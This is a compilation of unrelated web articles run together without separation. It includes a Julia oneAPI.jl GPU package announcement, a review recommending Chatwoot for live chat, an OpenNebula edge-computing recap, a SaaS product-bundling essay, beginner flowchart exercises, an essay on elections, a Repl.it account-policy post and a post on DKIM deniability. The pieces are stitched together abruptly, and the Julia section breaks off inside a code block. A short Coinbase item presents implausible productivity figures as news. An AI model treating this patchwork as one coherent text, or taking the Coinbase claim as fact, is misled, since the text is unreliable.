any (sufficiently recent) Linux kernel. The initial download, powered by Julia’s artifact
subsystem, might take a while to complete. After that, you can import the package and start
using its functionality:</p><pre><code>julia&gt; using oneAPI

julia&gt; oneAPI.versioninfo()
Binary dependencies:
- NEO_jll: 20.42.18209+0
- libigc_jll: 1.0.5186+0
- gmmlib_jll: 20.3.2+0
- SPIRV_LLVM_Translator_jll: 9.0.0+1
- SPIRV_Tools_jll: 2020.2.0+1

Toolchain:
- Julia: 1.5.2
- LLVM: 9.0.1

1 driver:
- 00007fee-06cb-0a10-1642-ca9f01000000 (v1.0.0, API v1.0.0)

1 device:
- Intel(R) Graphics Gen9
</code></pre><h2 id="the-onearray-type">The <code>oneArray</code> type</h2><p>Similar to CUDA.jl’s <code>CuArray</code> type, oneAPI.jl provides an array abstraction that you can
use to easily perform data parallel operations on your GPU:</p><pre><code>julia&gt; a = oneArray(zeros(2,3))
2×3 oneArray{Float64,2}:
 0.0  0.0  0.0
 0.0  0.0  0.0

julia&gt; a .+ 1
2×3 oneArray{Float64,2}:
 1.0  1.0  1.0
 1.0  1.0  1.0

julia&gt; sum(ans; dims=2)
2×1 oneArray{Float64,2}:
 3.0
 3.0
</code></pre><p>This functionality builds on the <a href="https://github.com/JuliaGPU/GPUArrays.jl/">GPUArrays.jl</a>
package, which means that a lot of operations are supported out of the box. Some are still
missing, of course, and we haven’t carefully optimized for performance either.</p><h2 id="kernel-programming">Kernel programming</h2><p>The above array operations are made possible by a compiler that transforms Julia source code
into SPIR-V IR for use with oneAPI. Most of this work is part of
<a href="https://github.com/JuliaGPU/GPUCompiler.jl">GPUCompiler.jl</a>. In oneAPI.jl, we use this
compiler to provide a kernel programming model:</p><pre><code>julia&gt; function vadd(a, b, c)
           i = get_global_id()
           @inbounds c[i] = a[i] + b[i]
           return
       end

julia&gt; a = oneArray(rand(10));

julia&gt; b = oneArray(rand(10));

julia&gt; c = similar(a);

julia&gt; @oneapi items=10 vadd(a, b, c)

julia&gt; @test Array(a) .+ Array(b) == Array(c)
Test Passed

<code>oneL0</code> submodule of oneAPI.jl:</p><pre><code>julia&gt; using oneAPI.oneL0

julia&gt; drv = first(drivers())
ZeDriver(00000000-0000-0000-1642-ca9f01000000, version 1.0.0)

julia&gt; dev = first(devices(drv))
ZeDevice(GPU, vendor 0x8086, device 0x1912): Intel(R) Graphics Gen9
</code></pre><p>This is a low-level interface, and importing this submodule should not be required for the
vast majority of users. It is only useful when you want to perform very specific operations,
like submitting an certain operations to the command queue, working with events, etc. In
that case, you should refer to the <a href="https://spec.oneapi.com/level-zero/latest/index.html">upstream
specification</a>; The wrappers in the
<code>oneL0</code> module closely mimic the C APIs.</p><h2 id="status">Status</h2><p>Version 0.1 of oneAPI.jl forms a solid base for future oneAPI developments in Julia. Thanks
to the continued effort of generalizing the Julia GPU support in packages like GPUArrays.jl
and GPUCompiler.jl, this initial version is already much more usable than early versions of
CUDA.jl or AMDGPU.jl ever were.</p><p>That said, there are crucial parts missing. For one, oneAPI.jl does not integrate with any
of the vendor libraries like oneMKL or oneDNN. That means several important operations, e.g.
matrix-matrix multiplication, will be slow. Hardware support is also limited, and the
package currently only works on Linux.</p><p>If you want to contribute to oneAPI.jl, or run into problems, check out the GitHub
repository at <a href="https://github.com/JuliaGPU/oneAPI.jl">JuliaGPU/oneAPI.jl</a>. For questions,

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content"><div><div><p>Last Updated </p><!-- --><p>July 17, 2020</p></div><div><p>Reading Times:</p><p>Summary only: 1 minute</p></div></div><h2 id="introduction">Introduction</h2><p>If you've popped your head into Satchel anytime in the past three weeks, you might've seen one of a few (okay fine, one of many) live chat widgets on the bottom-right of the site. If you had the suspicion that we were testing something out, you were right.  We've pretty much done a gigantic A/B test (in this case, more like an A/B/C/D/E/F/G test) to figure out what live chat software you should use if you're an early-stage startup.</p><p>Here's the punchline: use Chatwoot. We think it actually beats out a lot of the big-name, established chat tools out there (and by more than a small margin). It's open-source w/ a hosted option<span></span><span>Read: free or low-cost.</span>, has all of the core functionality you need, was best-liked by visitors when we tested on Satchel (tied with Intercom), and, importantly, passed all of the engineering litmus tests that we've developed over the past few weeks. More on these in a bit.</p><p>We were originally going to split our recommendation between Intercom and Chatwoot, but after talking to a lot of later-stage Intercom customers, we've heard enough stories of price-gouging that we think that there's a big red flag. The full story is a bit more nuanced, but we'll dive into it shortly</p><div><p><a target="_blank" href="https://chatwoot.com/?utm_source=satchel"><img src="https://d33wubrfki0l68.cloudfront.net/778fcd4101a8074c6a90332fc23cfc02f3964db7/7bec3/logos/chatwoot.svg"></a></p><div><p>Our Recommendation</p><p><a target="_blank" href="https://chatwoot.com/?utm_source=satchel">Chatwoot</a></p><p>Robust, open-source, and preferred by visitors</p><p>Chatwoot was one of the best-liked live chat tools in the eyes of our visitors, and doesn't run into any engineering issues that are many other alternatives have. Plus, it's open source, with a generous hosted option.</p><p><a target="_blank" href="https://chatwoot.com/?utm_source=satchel">chatwoot.com</a></p></div></div><h2 id="ratings-matrix">Ratings Matrix</h2><h2 id="general-findings">General Findings</h2><h3 id="initial-methodology">Initial Methodology</h3><p>We're focused primarily on the core live chat use case — human-to-human communication. Some chat tools come as part of a larger "customer relationship platform," with things like email marketing capabilities, help desk software, a customer CRM, etc. While some early-stage startups take advantage of this functionality, we find that most of it usually goes unused. Of the 18 founders we surveyed, all but one said that the human-to-human communication was overwhelmingly the most important aspect of their live chat setup<span></span><span>The remaining founder saw the live chat messenger as another communication channel for marketing automation. Marketing automation is a closely related usecase, so we'll talk about that in a bit.</span>. We aren't going to outright dismiss this auxiliary functionality — we'll go more in-depth when we make our rounds discussing each specific product, as these features are product-specific — but much of early-stage startup usage of these live chat products is for, well, live<span></span><span>Or almost live, in the case of continuing a live chat conversation over email.</span> human-to-human communication. Therefore, we'll be focusing our evaluation on the aspects of a product related to human-to-human communication.</p><p>Affordability and ease of use are straightforward and easy to understand, with the latter encompassing both our high-level evaluation of ease of use as well as our assessment of quality-of-life features (e.g. canned responses). Closely related to ease of use is our appraisal of each product's core functionality, which encompass any features that are directly related to live chat. We categorize any functionality that could warrant a standalone article (e.g. marketing automation, help desk, customer CRM, etc.) as adjacent functionality</p><p>After testing for a few weeks, we formulated two new criteria: robustness and end-user preference. We realized that these criteria are substantially more important than we initially gave them credit for, and are the basis of our litmus tests.</p><h3 id="the-litmus-tests">The Litmus Tests</h3><p>Here's where it gets interesting — we did a meta survey of 50 visitors via live chat (doubly meta) to learn more about live chat and live chat products from an end-user perspective. Initially, what we heard didn't surprise us too much — if you've implemented a live chat widget but don't respond, then your users will get frustrated; if you cover up important content with an immovable floating chat button, same deal. These are pretty obvious.</p><p>But we quickly started to see the emergence of an interesting, less obvious trend: that visitors often over-index on the quality of a live chat widget. Specifically, we found that visitors had a worse impression of a live chat widget when it had worse design, and, importantly, that impression translated to the rest of the webpage. </p><p>In other words, using a poorly-designed live chat widget lowered people's impressions of the rest of our website. That said, this observation didn't go in the other direction — that a well-designed live chat tool didn't leave a better impression on visitors than without.</p><p>We initially thought this entire observation was an oddity, but it does make intuitive sense. People are naturally drawn to things that look out-of-place. If you have a well-designed site with well-designed live chat, then your visitors' impressions will be that it's business as usual. But if you have a well-designed site with a poorly-designed widget, then your visitors will start to anchor on that one poorly-designed element. This is compounded by the fact that a live chat widget will likely be the most prominent thing on your website that you won't have styling control over<span></span><span>Plus, whether you like it or not, some live chat providers try to make their widgets as eye-catching as possible.</span>, so it tends to draw lots of attention.</p><p>As we wrapped up testing, we came across another realization: the best products to use (for both us and visitors) were those that had the most attention to detail in the live chat widget. This should make intuitive sense — if a company doesn't address some easy-to-fix (but important) details when engineering the part of the product that people will see and interact with the most, then that's usually an indication that other things are broken behind the scenes. For example, there are plenty of ways for a widget to expand the chatbox when you click on a live chat button: CSS fades, CSS resizes, JS resizes, etc. If a product chooses one of the few approaches that lag and drop frames, especially when there are perfectly performant and usable alternatives, then that's usually a pretty good predictor that the overall quality of the product isn't top notch. The same goes for positioning issues (broken CSS <code>position</code>), formatting problems (inconsistent, out-of-whack <code>li</code> margins), etc.</p><h2 id="our-recommendation-chatwoot">Our Recommendation: Chatwoot</h2><p>We think that Chatwoot has produced a better live chat product than a number of companies that have had a lot more time and manpower. This wasn't a conclusion we expected to make going into our testing process.</p><p>First off, Chatwoot is built well and designed well. The two litmus tests we mentioned earlier? It passes both with flying colors. </p><p>Chatwoot has one of the most well-designed chat widgets both in our eyes and, more importantly, the eyes of our visitors. According to the visitors we talked to, Intercom and Chatwoot were the standouts by far, with Intercom barely edging out the #1 spot. Moreover, Chatwoot, along with Intercom, LiveChat.com, and Olark, was the only chat product that we tested that didn't have a noticeable engineering deficiency on its chat widget. Chatwoot's live chat widget expands from the chat button smoothly without stutters (unlike Freshchat), visitors didn't notice any styling issues (unlike Tawk.to), and the widget loaded in and updated as expected on every website we tested it on (unlike Drift and Crisp). As previously mentioned: while other product's front-end engineering deficiencies might be minor, we found that they're usually a pretty good canary in the coal mine.</p><p>For human-to-human live chat, Chatwoot more or less has all of the core functionality that you should need. It has support for tagging, custom canned responses and shortkeys, chat user details (e.g. browser, OS, etc. that are useful for debugging), email continuation (i.e. to allow users to continue conversations over email), a relatively simple analytics dashboard (not the most advanced one out there, but perfectly serviceable as long as you don't have a full-blown customer service division), and a solid implementation of expected API functionality (e.g. for propagating metadata programmatically to show up when you're chatting with a user, e.g. programmatically setting a user ID so you immediately know what account your user is using). </p><p>The main thing that it lacks is a library of native integrations and support for prequalification and advanced info gathering (through a chatbot or a custom form). Chatwoot has a Slack integration that can ping a Slack channel when new messages come in, but that's it in terms of native integrations. If you want an integration with another product, you'll have to roll it out yourself via their webhook. There's no one-click solution to, say, auto-populate a new account in your CRM when a new visitor starts chatting — if you have a critical integration, you'll have to fiddle around with some webhook connectors like Zapier/Integromat<span></span><span>This is likely a downside but not a dealbreaker if you're an early-stage startup.</span>. Secondly, it doesn't have much support for prequalification or information gathering tasks. Specifically: the widget has a well-designed and well-integrated optional email capture field, but apart from that, it doesn't have any capability to add custom form fields (e.g. for requiring someone's name and company size before they can chat). There's also no chatbot support, although this is ostensibly on their roadmap, so you can't do things like auto-route people to a pricing page if they're interested in pricing. That said, we think that this is a perfectly acceptable tradeoff for an early-stage startup. Chatbots and custom fields are typically used for prequalification at high volume to save time by customer service agents, but usually degrade the chat experience compared to a human on the other end. This shouldn't be something to worry about for an early-stage company.</p></div></div>

<p>On October 21, alongside AWS, Microsoft and ARM, our colleagues from <strong>Rancher Labs</strong> hosted the <a rel="noreferrer noopener" href="https://edgeconference.io/" target="_blank">Computing at the Edge with Kubernetes</a> conference. This virtual event, with more than 2,500 registrants and over 1,000 attendees, featured 24 presentations from preeminent K8s experts and practitioners and was designed to share best practices and insight on how to get started and how to get the most from Kubernetes edge deployments.</p>



<p>Again, this was a great opportunity for OpenNebula to share some of the developments happening around <a rel="noreferrer noopener" href="https://oneedge.io/" target="_blank">ONEedge</a>, our new open source edge computing platform. In our presentation, based on the recent integration with the <strong>Docker Hub</strong> marketplace and <a rel="noreferrer noopener" href="https://opennebula.io/firecracker/" target="_blank">Firecracker</a>—the new virtualization technology developed by Amazon Web Services (AWS)—we showed how to easily <strong>deploy multiple K3s clusters at the edge</strong> for multiplayer gaming. </p>

<p>We used <strong>Agones</strong> (a platform developed by Google and Ubisoft) to deploy at the edge a dedicated game server for Xonotic, the well-known open source FPS multiplayer game, and all that in just a few minutes! 🎮</p>



<p>Take a look at the presentation on your own time, and don’t forget that our <a rel="noreferrer noopener" href="https://opennebula.io/get-edge-computing-whitepaper/" target="_blank">White Paper on Edge Computing</a> is already available for download! 🚀</p>

    <p><img src="https://staysaasy.com/assets/selling-to-the-enterprise-football.jpg" alt="Expand the playing field"></p>

<p>Product differentiation is one of, if not <em>the</em> most important consideration when building an enterprise SaaS company. With a product that stands out from the market, everything is easier: your reputation and brand grow rapidly, your marketing team is armed to the teeth with great customer stories, and your sales team are fat and happy with all of the deals that they close. Without a differentiated product, you typically have to fall back on strategies that aren’t nearly as effective in order to win:</p>

<ul>
  <li>Out-spending the competition with sales &amp; marketing</li>
  <li>Undercutting your competitors’ pricing</li>
  <li>Differentiating in other aspects of your offering beyond your product: typically with lower-margin services and support</li>
</ul>

<p>All of these options are expensive, infeasible, or business-weakening in the long run. Once you’ve hit product/market fit and are beginning to sell at scale, having a differentiated product is critical to outsized success.</p>

<p>Building a differentiated product doesn’t mean that you’re head-and-shoulders above the competition in every way, but it <em>does</em> require that you’re provably better than your competitors along dimensions that matter to your customers. In this post I run through one differentiation strategy that I’ve seen several successful enterprise companies use to good effect.</p>

<h2 id="expanding-the-playing-field">Expanding the Playing Field</h2>

<p>One of the simplest and most effective ways to differentiate your product is to bundle and combine multiple product functions into a single suite.</p>

<p>The overall idea is simple and can be illustrated with a product like Microsoft Office:</p>

<ul>
  <li>Microsoft Office was originally a small set of software tools that included the earliest versions of flagship products such as Word and Excel.</li>
  <li>Microsoft acquired products such as Powerpoint to widen the scope of the Office suite.
A decade later (!), Microsoft added Outlook to own the then-nascent business email and communications space.</li>
  <li>In more recent years, Office added Office Communicator, and later Teams.</li>
  <li>Today, while Word, Powerpoint, Teams, or even Excel may not be the best products within their respective niches, the fact that they’re bundled into a single offering is a massive differentiator. Microsoft is able to compete against Slack because they bring the full weight of their office suite to bear. Similarly, Microsoft can compete against products such as GSuite because they bring a competitive workplace chat product.</li>
</ul>

<p>This might seem trivial (do more stuff and people will think you’re more special, gee I never thought of that!) but I think that there’s value in formalizing exactly how and why this works.</p>

<h2 id="why-it-works">Why It Works</h2>

<p>Enterprise buyers are efficient (or lazy, depending upon your point of view). All else being equal, they don’t want to deal with procuring multiple vendors. Every new buying process requires vendor negotiations, security and compliance reviews, and wrangling internal stakeholders to get onboard. It’s significantly easier for an enterprise buyer to choose a single suite that will do everything, even if they aren’t all perfect.</p>

<p>There’s also a <a href="https://en.wikipedia.org/wiki/Cheerleader_effect">cheerleader effect</a> where your ensemble suite will be perceived as more powerful. By expanding the suite of technologies, you force the competition to battle with you on a much wider front or an entirely different battlefield. When Slack sells into an enterprise, they pitch a vision of interconnected chat and conferencing. When Microsoft approaches that same client, they pitch a single line item that encompasses the majority of day-to-day workplace activities. Slack naturally looks weaker on this expanded playing field.</p>

<p>A common startup product tactic is to specialize a single feature for a niche market and use it as a wedge into a market; by combining a range of features for a single buyer and raising their expectations, you also slow challengers who seek to build enter your space.</p>

<p>And if one piece of your product is truly dominant (for Office this would probably be Excel), you can use it as a trump card to win difficult deals. Teams isn’t better than Slack; Microsoft Word isn’t better than Notion; Outlook isn’t better than Gmail. OneDrive and Sharepoint aren’t better than anything. But many industries near-total reliance upon Excel allows the entire suite to continue to thrive, and all of Office succeeds as a result.</p>

<p>Even in the best product suites, there’s usually a dominant product (Excel for Microsoft Office; Jira for Atlassian; Sales Cloud for Salesforce). The other parts of the product portfolio become a solid supporting cast, kind of like in a rock band. You don’t need to be Queen where every member of the group is superlatively strong on their own; you can be Van Halen where a superstar is bolstered by a great group of performers who keep things going (RIP).</p>

<h2 id="what-to-consider">What To Consider</h2>

<p>If you’re constantly finding yourself fighting competitors once your product has strong traction and is well-loved, consider if there are natural options to expand your product line. When done well, this can be a strong differentiating force, creating a virtuous cycle in which you win more deals, gain more revenue, and can fund higher product quality as well as additional expansions.</p>

<p>To build an effective product suite, you need to bundle several products and (usually) sell them all to the same buyer. In the case of Office, Microsoft often sells to IT departments. Atlassian sells Jira, Confluence, StatusPage, OpsGenie, etc. to Engineering buyers. Workday sells to HR. Sticking with one buyer (at least initially) is important as in practice most enterprise purchasing decisions boil down to a single decision-maker. Even if your marketing product could be really powerful for sales, in practice it’s hard to get a CMO and CRO to coordinate on a purchase.</p>

<p>Once you’re already installed in a given buyer, this strategy gives you more and more options to expand effectively. You have access to your buyer, and you can often literally just ask them what else they care about and build it for them. I presume that this is the type of strategy that DataDog used as they <a href="https://www.datadoghq.com/blog/dash-2020-new-feature-roundup/">expanded into Incident Response and Security monitoring</a> – they’re just going down the list of the different needs for the CTOs whom they sell to.</p>

<p>A key step when combining features into a suite is that your product needs to be a strong enough contender on every dimension that you can provide a narrative of solving a wide swath of needs for one buyer (with customer referrals that back you up!). Your product suite is only ultimately as strong as its weakest member. A common mistake is to spread yourself too thin and end up with a product that checks a ton of boxes but won’t hold up in the market. Buyers tend to have a small community, and this sort of bad reputation can ruin you so make sure that you don’t dilute your focus!</p>

<h2 id="takeaways">Takeaways</h2>

<ul>
  <li>Differentiating your product is a critical step to building an enduring SaaS business.</li>
  <li>One strategy for differentiation is to expand your product’s functionality to expand your value for a particular buyer and simplify their purchasing decisions.</li>
  <li>Success with one buyer profile (CTO, CRO, CMO, etc.) is a great way to expand – by working with that buyer to understand their needs, you have a natural leg up to run product experiments to expand your portfolio.</li>
  <li>But don’t spread yourself too thin –&nbsp;the overall quality of your product portfolio has to remain strong.</li>
</ul>

<p>Coinbase reported that its employee productivity has jumped 1000 percent this week alone. On a relative basis, when compared with peers, the productivity has seen a jump of 3000 percent, way more than our initial estimates. </p>



<p>“Our goal is to move towards a model that looks like The Matrix” said Brian Armstrong, reacting to the jump in productivity. “This is what we tell our employees – just bring the energy and brains. Plug in, and get into the zone. Thats the goal.” he concluded.</p>

        <p>When I was a student back in the 90's, flowcharts were a widely used tool to teach students the basics of computer programming.
A flowchart is a diagram that represents all the necessary steps for solving a specific task.</p>
<p>In my opinion, beginner programmers should give flowcharts a chance as they provide a very simple learning model. And I think that, given the step-by-step nature of the flowchart, and with enough practice, it can give students a great confidence in their own skills. </p>
<p>Moving along.. </p>
<p>The following flowchart represents a simple program that asks the user for a number, stores it in a variable called "X", then adds 1 to "X", and finally prints the value of "X".</p>
<p><img src="https://joaoventura.net/static/blog/2020/flowchart1.svg"></p>

<p>If you were to run this program and gave it the number 10, the program would output the number 11. If you gave it the number 20, it would output 21, and so on.</p>
<p>But computer programs can be more complex. For instance, the following flowchart represents a program that asks the user for a number, and checks if it is greater than 10.
If it is greater than 10, it writes "X is greater than 10", else it writes "X is <strong>not</strong> greater than 10".</p>
<p><img src="https://joaoventura.net/static/blog/2020/flowchart2.svg"></p>

<p>With only these kind of blocks you can do a lot of things! Here's another program that asks the user for a number and writes "Hello World" that many times.</p>
<p><img src="https://joaoventura.net/static/blog/2020/flowchart3.svg"></p>

<p>Basically, while X is greater than 0 it prints "Hello World" and subtracts 1. When X reaches 0 the program ends.</p>
<p>I will leave you with a couple of exercises that you can use to practice your flowcharts-fu!</p>
<h3>Basic exercises</h3>
<ol>
<li>Do a flowchart that places X=0 and then outputs it (this one's really basic).</li>
<li>Do a flowchart that ask the user for a number, multiplies it by 2 and then output it.</li>
<li>Do a flowchart that asks the user for two numbers (one at a time, you may call them X and Y), stores the sum in a variable Z, and outputs it.</li>
<li>Do a program that asks the user for two numbers (again, one at a time), and swaps the value of the variables (you may need a third temporary variable).</li>
<li>Do a program that asks the user for the number of hours, the price per hour and outputs how much is due.</li>
</ol>
<h3>Exercises with comparisons</h3>
<ol>
<li>Do a program that asks the user for two numbers and checks if they are equal or not. The program should write something like "the numbers are equal" or "the numbers are different".</li>
<li>Do a program that asks the user for two numbers and outputs the value of the larger one.</li>
<li>Do a program that asks the user for two numbers and outputs the value of the smaller one.</li>
<li>Do a program that asks for three numbers and outputs the value of the larger one.</li>
<li>Do a program that asks for three numbers, computes their average, and writes "Cold" if the average is less than 20. If it's greater or equal than 20, it should write "Warm".</li>
</ol>
<h3>Exercises with loops</h3>
<ol>
<li>Do a program that asks for a number <strong>X</strong> and writes "Hello World" <strong>X</strong> times (see above!).</li>
<li>Do a program that asks for a number <strong>X</strong> and sums all integers from <strong>X</strong> to 1. For instance, if X=4, it should do 4+3+2+1. <strong>Hint: keep the sum in another variable, and initialize it as 0.</strong></li>
<li>Do a program that asks for a number <strong>X</strong> and outputs the factorial of X. For instance, the factorial of 4 is 4x3x2x1.</li>
<li>Build a small program that implements the guess game. The program should ask user 1 for a number <strong>X</strong>. Then, user 2 must guess the number. The program must keep saying that the number <strong>Y</strong> (which is the number that user 2 inserts) is greater or smaller than <strong>X</strong>. The program should end when the numbers are equal. </li>
</ol>
<p><br>
Have fun!<br>

<![CDATA[We Don’t Need Elections to Figure Out What People Want]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		




<p>I read today a very thought-provoking piece by Yuval Harari, a historian and philosopher. “<a href="https://www.nytimes.com/2020/02/03/opinion/harari-democracy-elections.html">You can vote but you can’t choose what is true.</a>” A paraphrased summary of his thesis: <em>Elections are awful ways of determining what is true. For that, we need to turn to experts and institutions, not popularity contests. However, elections are not about finding out what is true, but rather, about finding out what people want. And if a majority of people want a certain thing, whether it be Brexit or any other hot button topic of the day, then our political system should respect and grant the people their desires.</em></p>



<p>There is much that I agree with Harari on. But Harari is badly mistaken about the need for elections in order to determine what people want. For one simple reason. For the most part, we already know what people want.</p>



<p>People want economic security, so that they don’t have to worry about feeding, clothing and housing themselves.</p>



<p>People want material prosperity, so that they may enjoy leisure activities such as travel or fine dining.</p>



<p>People want physical security, against local criminals, foreign invaders, and an overzealous police state.</p>



<p>People want to live long healthy lives, free from disease and other ailments.</p>



<p>We do not need elections to determine whether or not people want those things, because the answer is already very well known for our most important needs. <em>What people disagree on, and what elections really come down to, is figuring out the best way to achieve the above objectives</em>.</p>



<p>Some people believe that the best way to achieve economic security is through taxpayer-funded social safety nets. While others believe that the best way to do it is through cutting taxes on corporations and the rich.</p>



<p>Some people believe that the best way to achieve material prosperity is through free trade, while others believe that the best way to achieve it is through trade barriers.</p>



<p>Some people believe that the best way to gain physical security is through a criminal justice system that is focused on civil rights, rehabilitation and gun control. While others believe that the best way to achieve it is through punitive deterrence and self-defence.</p>



<p>Some people believe that the best way to improve our healthcare system is through Universal Medicare. Others believe the answer lies in strengthening Obamacare. And yet others believe that the answer lies in dismantling both and letting the free market work its magic.</p>



<p>These are the hot button issues that divide our countries today. The issues that truly determine the outcomes of our elections and the makeup of our governments.</p>



<p>And yet, despite these vehement disagreements, it is remarkably clear what people want. No one fundamentally <em>wants</em> “Medicare” or “Obamacare” or “Free Markets” – people just want good affordable healthcare. No one dreams of “Free Trade” or “Tariffs” – people just want economic security.</p>



<p>It is true that there are a handful of issues where people disagree in principle, and want truly different things. Issues such as Abortion. Issues where neither side mounts much in the way of a factual or logical argument, because they both recognize that it is a purely subjective question with no objective answers.</p>



<p>But such issues are the exceptions, not the norm. Most voters on most debates pay close attention to facts, evidence and logic, because they recognize their centrality in resolving the disagreement. The things that truly divide and decide our elections aren’t fundamental differences in our desires. But rather, the truths we believe about the best way to achieve our shared desires.</p>



<hr>



<p>Harari wisely points out that if the goal is to find truth, elections are an awful way to go about it. Using a popular vote to decide if we should adopt Universal Healthcare, is indeed like <a href="https://www.newstatesman.com/politics/uk/2017/03/richard-dawkins-we-need-new-party-european-party" target="_blank" rel="noreferrer noopener" aria-label="letting passengers vote on which runway the pilot should land on (opens in a new tab)">letting passengers vote on which runway the pilot should land on</a>. The analogy may not be perfect, but it is far more accurate than the “do-you-like-strawberries-or-apples” alternative.</p>



<p>As Harari points out, the best way to uncover truth is to reject popular opinion and to lean on the strengths of our institutions. He is also not the first to point this out. America’s own founding fathers had vehemently come out against democracy and fashioned the nation as a constitutional republic, for this very reason. To quote John Adams, <em>“Democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide.”</em></p>



<p>This is precisely the reason I had argued in past articles that we need to <a href="https://outlookzen.com/2013/11/06/its-time-to-reinvent-democracy/">radically reinvent our current conceptions of democracy</a>. We need to <a href="https://outlookzen.com/2014/01/21/democracy-by-jury/">reinvent it in the image of methodical jury trials</a>, not cheerleading contests. We need to <a href="https://outlookzen.com/2014/06/29/reinventing-democracy-the-google-way/">reinvent it to resemble our most successful search engines</a>, not a vacuous twitter mob.</p>



<p>The most important questions that our elections are seeking to answer, is not <em>what</em> we want, but <em>how</em> we can get what we want. And elections are truly the worst way to find that answer.</p>

		<p>When we started Repl.it, we set out to remove all friction from getting started with programming. That also meant getting out of the way and letting you code as quickly as possible. As part of that, and for a long time, you could start coding on Repl.it without a user account. </p>
<p>We anticipated that giving free unfettered compute to the universe would be challenging. Still we didn't flinch and made it a point to innovate on sandboxing, security, and anti-abuse tools, and we've been largely successful at that. Today, Repl.it the largest open compute platform on the internet, one where you don't need a credit card or even an account to start executing. We run 150,000 concurrent containers, which is 10x what we used to run last year.</p>
<p>We have our fair share of war stories, like when we had to battle dark-web hackers trying to sell DDoS attacks from our site for Bitcoin. Luckily reCAPTCHA from Google was a massive help, protecting against botting made it possible for us to continue to grow and offer our services for free.</p>
<p>Sadly, earlier this year, Google surprised us that they're going to be charging for reCAPTCHA. Of course, it makes business sense for them, but for a startup like ours, operating at the scale we operate at, it meant that we have to pay them more than we make in monthly revenue<small>[1]</small>.</p>
<p>That leaves us with two choices:</p>
<ul>
<li>leave the site vulnerable to botting and attacks resulting in an immense amount of time spent fighting abuse and risking outages</li>
<li>phase out the anonymous experience and focus our efforts and tools on securing the logged-in user experience</li>
</ul>
<p>We decided to go with the latter, and we hope you'll stick with us and create an account. Beyond the 5 minutes it takes to sign up, there is only an upside to doing so. We don't collect much data, and we respect user privacy. You're also going to unlock many features that were invisible for you in the anonymous experience:</p>
<ul>
<li>Name and organize your repls</li>
<li><a href="https://repl.it/site/hosting">Host apps and websites</a></li>
<li><a href="https://repl.it/site/multiplayer">Collaborate with others in Multiplayer</a></li>
<li>Claim and build a profile with the repls you're most proud of</li>
<li>Particpate in our <a href="https://repl.it/site/community">community forums</a></li>
</ul>
<p>And many more that we're sure you'll enjoy discovering.</p>
<h2 id="timeline">Timeline</h2>
<p>Google gave us only one month to move off, so we're going to have to move fast. Here are the changes to expect in the upcoming few weeks: </p>
<ul>
<li>We'll transition our language pages (<code>/languages/{lang_name}</code>) to a barebones REPL with limited opportunity for abuse. That way if you're used to using Repl.it to try out just a bit of code, you can continue to do that without logging in</li>
<li>repl.run, the url endpoint you could access command-line apps will redirect to the repl. repl.run is inherently anonymous, which makes it an attack vector without captcha</li>
<li>finally, you'll have to login to create a repl and save your work</li>
</ul>
<p>We remain committed to openness and instantness -- two principles that have made Repl.it special. I am thrilled to see you on the inside!</p>
<hr>
<p><small>1: it's worth noting that we're already big Google Cloud customers, and our spend only continues to grow with them. </small></p>

<p>Earlier this week, security researcher Ryan Castellucci published a blog post with a somewhat provocative title: <em><a href="https://rya.nc/dkim-privates.html">DKIM: Show Your Privates</a></em>.</p>



<p>After reading the ensuing discussions on <a href="https://news.ycombinator.com/item?id=24972609">Hacker News</a> and <a href="https://web.archive.org/web/20201104135629/https://old.reddit.com/r/crypto/comments/jmv4qd/dkim_show_your_privates/gb0h87a/?context=9">Reddit</a> about their DKIM post, it seems clear that the importance of <strong>deniability</strong> in online communications seems to have been broadly overlooked.</p>



<h2>Security Goals, Summarized</h2>







<p>When you design or implement any communications protocol, you typically have most or all of the following security goals:</p>



<ul><li><strong>Confidentiality</strong>: Only the intended recipients can understand the contents of a message (almost always achieved through encryption).</li><li><strong>Integrity</strong>: The message will be delivered without alterations; and if it is, the recipient will know to reject it.</li><li><strong>Availability</strong>: Authorized users will have access to the resources they need (i.e. a medium they can communicate through).</li></ul>



<p>However, you may also have one or more of the following security goals:</p>



<ul><li><strong>Authenticity</strong>: In a group communication protocol, you want to ensure you can validate which participant sent each message. This is loosely related to, yet independent from, integrity.</li><li><strong>Non-Repudiation</strong>: An extension of authenticity, wherein you cannot deny that you sent a message after you sent it; it’s provable that you sent it.</li><li><strong>Deniability:</strong> The complement to non-repudiation, wherein you can prove that you sent a message to your recipient, and then at a future time make it possible for other participants to have forged the message.</li></ul>



<p>It’s tempting to think of deniability as the opposite of non-repudiation, but in practice, you want messages to have authenticity for <em>at least</em> a brief period of time for both.</p>



<p>However, you cannot simultaneously have deniability and non-repudiation in a communication. They’re mutually exclusive concepts, even if they both build off authenticity. Hence, I call it a complement.</p>



<p>Off-The-Record messaging achieved deniability through publishing the signing key of the previous message with each additional message.</p>



<h2>Security Properties of DKIM</h2>



<p><a href="https://rya.nc/dkim-privates.html">Ryan Castellucci’s blog post</a> correctly observed that the anti-spam protocol DKIM, as used by most mail providers in 2020, incidentally also offers non-repudiation…even if that’s not <em>supposed to be</em> a primary goal of DKIM.</p>



<p>Non-repudiation can be bolted onto any protocol with long-term asymmetric cryptographic keys used to generate digital signatures of messages–which is exactly what DKIM does.</p>



<h3>Real World Case Study</h3>



<p>A while ago, the New York Post published a DKIM-signed email from someone claiming to be named Vadym Pozharskyi to Hunter Biden–son of the presidential candidate and former Vice President Joe Biden. </p>



<p>Because the DKIM public keys used by Gmail during that time period are known–but <em>not</em> the private keys–it’s possible to authenticate that the emails came from Gmail and is a valid email. And someone <a href="https://github.com/robertdavidgraham/hunter-dkim">did exactly this</a>.</p>



<p>In a similar vein, if someone wanted to embarrass an executive at a large company, accessing their colleagues’ email and leaking messages would be sufficient, since DKIM could be used to verify that the emails are authentic.</p>



<h3>Deniability in DKIM</h3>



<p>Ryan’s proposal for introducing deniability in DKIM was to routinely rotate signing keys and publish fragments of their old DKIM private keys (which are RSA keys) so that anyone can reconstruct the private key after-the-fact.</p>



<p>This kind of deniability is mostly to mitigate against the harm of data leaks–such as your friend’s laptop getting stolen and someone trying to lambaste you on social media for an email you sent 10+ years ago–rather than provide a legal form of deniability. (We’re cryptography nerds, not lawyers.)</p>



<p>If the laptop theft scenario took place, with DKIM, someone can cryptographically <strong>prove</strong> you sent the email at a specific time to your friend with a specific body, because it’s signed by (presumably Gmail’s) DKIM keys.</p>



